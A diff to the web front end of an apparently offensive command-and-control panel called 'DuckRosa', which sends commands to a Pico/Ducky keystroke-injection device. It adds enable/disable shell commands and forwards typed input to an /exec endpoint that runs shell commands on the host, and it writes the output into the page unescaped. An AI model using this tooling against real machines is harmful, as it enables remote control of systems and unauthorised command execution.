@@ -139,7 +139,7 @@
   <div class="term-container">
     <div id="terminal" class="terminal">
       <!-- ToDo if connected change on GET Connected from pico -->
-      <p>Connected to DuckRosa...</p>
+      <p></p>
     </div>
 
     <div class="input-wrapper">
@@ -154,11 +154,11 @@
     <div id="serverTerminal" class="terminal">
       <!-- ToDo add enable / disable Terminal {Host Machine} RISKS! but handy... -->
       <!-- ToDo If enabled Change turn to green from static red for disabled -->
-      <p>Server Shell Disabled...</p>
+      <p></p>
     </div>
 
     <div class="input-wrapper">
-      <span class="prompt">amiscreant💀duckrosa &gt;</span>
+      <span class="prompt">aMiscreant💀duckrosa &gt;</span>
       <input type="text" id="serverCmdInput" placeholder="Type to Server Shell" />
       <button onclick="sendServerCmd()">Send</button>
     </div>
@@ -509,14 +509,23 @@
         return true;
       }
       if (cmd === "help menu") {
-        terminal.innerHTML += `<p><b>Use the C2 buttons or type help for commands.</b></p>`;
+      terminal.innerHTML += `<p> </p>`;
+        terminal.innerHTML += `<p><b> Server Shell Commands </b></p>`;
+        terminal.innerHTML += `<p> _____________________________________________________________________________________</p>`;
+        terminal.innerHTML += `<p> </p>`;
+        terminal.innerHTML += `<p><b>enable_shell  - Enables access to Terminal.</b></p>`;
+        terminal.innerHTML += `<p><b>disable_shell - Disables access to Terminal.</b></p>`;
+        terminal.innerHTML += `<p> </p>`;
+        terminal.innerHTML += `<p> _____________________________________________________________________________________</p>`;
+        terminal.innerHTML += `<p> Server Shell controls: enable_shell, disable_shell</p>`;
+        terminal.innerHTML += `<p> _____________________________________________________________________________________</p>`;
+        terminal.innerHTML += `<p> </p>`;
         return true;
       }
       return false;
     }
-
     function sendServerCmd() {
-      const cmd = document.getElementById("serverCmdInput").value;
+      const cmd = document.getElementById("serverCmdInput").value.trim();
       if (!cmd) return;
 
       serverHistory.push(cmd);
@@ -525,14 +534,14 @@
       const terminal = document.getElementById("serverTerminal");
       terminal.innerHTML += `<p>amiscreant💀duckrosa &gt; ${cmd}</p>`;
 
-      // Check if local help/menu
+      // Local commands (like help/menu)
       if (handleLocalServerCmd(cmd)) {
         document.getElementById("serverCmdInput").value = "";
         terminal.scrollTop = terminal.scrollHeight;
         return;
       }
 
-      // Otherwise forward to backend
+      // Always forward to Pico/Ducky backend
       fetch("/setcmd", {
         method: "POST",
         headers: {
@@ -542,10 +551,53 @@
         body: JSON.stringify({ command: cmd })
       });
 
+      // Also forward to server-side terminal (logging + shell exec)
+      fetch("/terminalcmd", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-API-KEY": API_KEY
+        },
+        body: JSON.stringify({ command: cmd })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.message) {
+          // enable_shell / disable_shell feedback
+          const color = data.message.includes("enabled") ? "lime" : "red";
+          terminal.innerHTML += `<p style="color:${color}">[Server Shell] ${data.message}</p>`;
+          terminal.scrollTop = terminal.scrollHeight;
+          return;
+        }
+
+        // If not a toggle → actually run command
+        return fetch("/exec", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-API-KEY": API_KEY
+          },
+          body: JSON.stringify({ command: cmd })
+        });
+      })
+      .then(res => res ? res.json() : null)
+      .then(data => {
+        if (data && data.output) {
+          terminal.innerHTML += `<pre>${data.output}</pre>`;
+          terminal.scrollTop = terminal.scrollHeight;
+        }
+      })
+      .catch(err => {
+        terminal.innerHTML += `<p style="color:red">Error: ${err}</p>`;
+        terminal.scrollTop = terminal.scrollHeight;
+      });
+
+      // Clear input
       document.getElementById("serverCmdInput").value = "";
       terminal.scrollTop = terminal.scrollHeight;
     }
+
   </script>
-<footer>aMiscreant</footer>
+<footer><b>aMiscreant</b></footer>
 </body>
 </html>
